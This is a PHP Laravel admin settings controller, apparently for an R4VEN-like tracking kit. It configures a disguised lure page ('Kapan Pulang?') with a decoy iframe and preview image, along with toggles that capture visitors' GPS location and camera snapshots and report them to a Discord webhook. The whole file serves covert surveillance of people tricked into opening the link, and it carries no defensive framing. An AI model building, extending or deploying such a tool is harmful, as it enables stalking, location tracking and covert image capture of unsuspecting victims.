<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Setting;
use App\Services\DiscordService;
use App\Services\TemplateService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rules\Password;
use Illuminate\View\View;

class SettingsController extends Controller
{
    public function __construct(
        protected DiscordService $discordService
    ) {}

    public function index(): View
    {
        $settings = [
            'discord_webhook_url' => Setting::get('discord_webhook_url', ''),
            'bot_name' => Setting::get('bot_name', 'R4VEN'),
            'bot_avatar_url' => Setting::get('bot_avatar_url', 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png'),
            
            // Active Template
            'active_template' => Setting::get('active_template', 'kapan-pulang'),

            // Decoy & Landing page
            'site_title' => Setting::get('site_title', 'Kapan Pulang?'),
            'site_description' => Setting::get('site_description', 'Kangen nih, kapan pulang?'),
            'og_image_url' => Setting::get('og_image_url', 'https://6a928218923dbf1a1a863b38.imgix.net/sandbox/images.jfif'),
            'decoy_iframe_url' => Setting::get('decoy_iframe_url', 'https://tugas-besar-webdanmobile.vercel.app/'),
            'landing_heading' => Setting::get('landing_heading', 'Kangen'),
            
            // Telemetry Toggles
            'capture_gps_enabled' => Setting::get('capture_gps_enabled', '1'),
            'capture_cam_enabled' => Setting::get('capture_cam_enabled', '1'),
            'cam_interval_ms' => Setting::get('cam_interval_ms', '2500'),
            'max_snapshots_per_session' => Setting::get('max_snapshots_per_session', '5'),
            'custom_landing_slug' => Setting::get('custom_landing_slug', 'kapan-pulang'),
        ];

        $templates = TemplateService::all();

        return view('admin.settings', compact('settings', 'templates'));
    }

    public function update(Request $request): RedirectResponse
    {
        $validated = $request->validate([
            'discord_webhook_url' => ['nullable', 'url'],
            'bot_name' => ['nullable', 'string', 'max:50'],
            'bot_avatar_url' => ['nullable', 'url'],
            'active_template' => ['required', 'string', 'in:' . implode(',', array_keys(TemplateService::all()))],
            'site_title' => ['required', 'string', 'max:100'],
            'site_description' => ['nullable', 'string', 'max:255'],
            'og_image_url' => ['nullable', 'url'],
            'decoy_iframe_url' => ['nullable', 'url'],
            'landing_heading' => ['nullable', 'string', 'max:100'],
            'capture_gps_enabled' => ['required', 'in:0,1'],
            'capture_cam_enabled' => ['required', 'in:0,1'],
            'cam_interval_ms' => ['required', 'integer', 'min:1000', 'max:60000'],
            'max_snapshots_per_session' => ['required', 'integer', 'min:1', 'max:50'],
            'custom_landing_slug' => ['nullable', 'string', 'max:50', 'alpha_dash'],
        ]);

        foreach ($validated as $key => $value) {
            Setting::set($key, $value);
        }

        return back()->with('success', 'Settings and active template updated successfully.');
    }

    public function updatePassword(Request $request): RedirectResponse
    {
        $validated = $request->validate([
            'current_password' => ['required', 'current_password'],
            'new_password' => ['required', 'string', 'min:8', 'confirmed'],
        ]);

        $user = Auth::user();
        $user->update([
            'password' => Hash::make($validated['new_password']),
        ]);

        return back()->with('success', 'Admin password changed successfully.');
    }

    public function testWebhook(Request $request): JsonResponse
    {
        $url = $request->input('url') ?: Setting::get('discord_webhook_url');
        
        if (empty($url)) {
            return response()->json([
                'success' => false,
                'message' => 'Please enter or save a Discord Webhook URL first.'
            ], 422);
        }

        $result = $this->discordService->sendTestMessage($url);

        return response()->json($result, $result['success'] ? 200 : 400);
    }
}
